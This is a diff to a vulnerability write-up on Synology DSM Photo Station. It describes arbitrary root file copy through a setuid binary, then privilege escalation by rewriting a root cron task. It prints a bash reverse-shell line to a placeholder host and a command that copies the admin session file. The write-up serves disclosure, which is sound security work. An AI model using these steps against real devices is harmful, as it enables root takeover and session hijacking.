@@ -132,11 +132,11 @@ As a result of the code above, `>`, `<`, `|` and `&` can be used to achieve comm
 ## Vul-03: Read-Write Arbitrary Files
 ---
 After we got the shell, we continued to find security flaws in the DSM. The binary program `synophoto_dsm_user` got our attention. This binary is a **setuid program**, and has a powerful copy function.  
-With the `--copy` parameter, it will do the `cp` command and **copy a file with the root permission**. This make us have the ability to read/write an arbitrary file .
+With the `--copy root` parameter, it will do the `cp` command and **copy a file with the root permission**. This make us have the ability to read/write an arbitrary file .
 
 ## Vul-04: Privilege Escalation
 ---
-With the previous Vul-03, we can exploit the vulnerability and **escalate our privilege to root**. We first tried modify the `/etc/crontab` file, but failed due to the [AppArmor](https://en.wikipedia.org/wiki/AppArmor) protection. So we change our target to the file that will be invoked by crontab. Finally we found `/tmp/synoschedtask`, a task which will be invoked by crontab as root. We use `synophoto_dsm_user` to modify its file content to the following command:
+With the previous Vul-02 ( RCE ) and Vul-03 ( Read-Write Arbitrary Files ), we can exploit the vulnerability and **escalate our privilege to root**. We first tried modify the `/etc/crontab` file, but failed due to the [AppArmor](https://en.wikipedia.org/wiki/AppArmor) protection. So we change our target to the file that will be invoked by crontab. Finally we found `/tmp/synoschedtask`, a task which will be invoked by crontab as root. We use `synophoto_dsm_user` to modify its file content to the following command:
 ```
 /volume1/photo/bash -c '/volume1/photo/bash -i >& /dev/tcp/x.x.x.x/yyyyy 0>&1'
 ```
@@ -145,7 +145,7 @@ Now we can wait for our reverse shell, with the root permission.
 ![Remote Code Execution](http://i.imgur.com/5YrQU54.jpg)
 
 
-Also by exploiting Vul-02 ( RCE ) and Vul-03 ( Read-Write Arbitrary Files ), we're able to login the service as as admin. If the admin is logged in, we can use the following command to get the admin's session ID:
+Also by exploiting Vul-02 and Vul-03, we're able to login the service as admin. If the admin is logged in, we can use the following command to get the admin's session ID:
 
 ```
 usr/syno/bin/synophoto_dsm_user --copy root /usr/syno/etc/private/session/current.users /volume1/photo/current.users
